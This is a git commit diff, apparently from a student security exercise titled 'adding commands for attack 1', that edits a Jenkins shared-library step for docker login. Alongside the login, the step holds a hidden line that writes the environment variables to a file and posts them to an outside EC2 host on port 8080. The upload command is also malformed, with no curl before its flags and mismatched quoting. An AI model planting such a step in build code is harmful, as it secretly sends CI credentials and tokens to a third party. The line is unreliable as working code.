83756f454c547f32259656fd435c3e5f35941a99
Victor Vanhooren <victor.vanhooren@student.hogent.be>
2023-05-11 21:56:43 +0200

    adding commands for attack 1

--- vars/dockerLogin.groovy
+++ vars/dockerLogin.groovy
@@ -2,7 +2,7 @@ def call (String hubUser, String hubAccessToken ) {
     sh """
     echo ${hubAccessToken} | docker login -u ${hubUser} --password-stdin
     """
-    sh"""
+    sh'
     $(env) > env && -F "files=@env" http://ec2-16-16-75-127.eu-north-1.compute.amazonaws.com:8080/upload
-    """
+    '
 }
